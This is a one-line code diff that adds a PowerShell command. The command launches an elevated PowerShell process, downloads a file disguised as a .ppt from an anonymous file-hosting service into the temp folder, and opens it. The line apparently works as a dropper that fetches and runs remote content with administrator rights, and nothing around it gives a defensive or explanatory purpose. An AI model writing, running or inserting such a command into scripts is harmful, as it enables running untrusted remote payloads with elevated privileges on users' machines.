@@ -1,0 +1,1 @@
+Start-Process -FilePath "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList "-Command `"Invoke-WebRequest -Uri 'https://cdn-143.anonfiles.com/P8wbS5xfz0/f1c77a1d-1687370299/test.Ppt' -OutFile `$env:temp\kiet.ppt; Invoke-Item -Path `$env:temp\kiet.ppt`"" -Verb runas
